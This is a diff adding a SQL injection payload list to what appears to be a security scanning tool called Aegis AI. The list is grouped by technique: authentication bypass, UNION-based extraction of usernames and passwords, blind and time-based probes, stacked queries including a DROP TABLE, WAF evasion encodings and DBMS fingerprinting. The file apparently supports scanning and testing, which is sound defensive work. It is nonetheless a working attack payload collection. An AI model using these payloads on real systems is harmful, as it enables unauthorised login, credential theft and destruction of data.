@@ -1,0 +1,89 @@
+# ──────────────────────────────────────────────────────────────────
+# Aegis AI — SQL Injection Payloads
+# Lines starting with # are comments. Blank lines are ignored.
+# ──────────────────────────────────────────────────────────────────
+
+# ── Classic error-based ──────────────────────────────────────────
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1'--
+' OR '1'='1'/*
+" OR "1"="1"--
+' OR ''='
+') OR ('1'='1
+')) OR (('1'='1
+
+# ── Authentication bypass ───────────────────────────────────────
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+admin'--
+admin' #
+admin'/*
+' OR 'x'='x
+') OR ('x'='x
+' OR 1=1; --
+1' OR '1' = '1
+
+# ── UNION-based extraction ──────────────────────────────────────
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT username,password FROM users--
+' UNION ALL SELECT NULL,NULL,NULL--
+1' UNION SELECT 1,@@version--
+1' UNION SELECT 1,table_name FROM information_schema.tables--
+
+# ── Boolean-based blind ─────────────────────────────────────────
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+' AND SUBSTRING(@@version,1,1)='5'
+
+# ── Time-based blind ────────────────────────────────────────────
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND pg_sleep(5)--
+' || pg_sleep(5)--
+
+# ── Stacked queries ─────────────────────────────────────────────
+'; DROP TABLE test--
+'; SELECT SLEEP(5)--
+'; SELECT pg_sleep(5)--
+
+# ── WAF evasion variants ────────────────────────────────────────
+'%20OR%20'1'%3D'1
+'/**/OR/**/1=1--
+' oR '1'='1
+'%09OR%091=1--
+' /*!OR*/ 1=1--
+'||1=1--
+' OR 1<2--
+' OR 2>1--
+%27%20OR%20%271%27%3D%271
+' UnIoN SeLeCt 1,2,3--
+' uni/**/on sel/**/ect 1,2,3--
+
+# ── Error generation (for DBMS fingerprinting) ──────────────────
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
+' AND updatexml(1,concat(0x7e,version()),1)--
+
+# ── JSON context ────────────────────────────────────────────────
+{"id":"1 OR 1=1"}
+{"user":"admin' OR '1'='1"}
+{"search":"' UNION SELECT NULL--"}
+
+# ── Integer-based ───────────────────────────────────────────────
+1 OR 1=1
+1 AND 1=1
+1 AND 1=2
+1; SELECT SLEEP(5)
+-1 OR 1=1
+0 OR 1=1
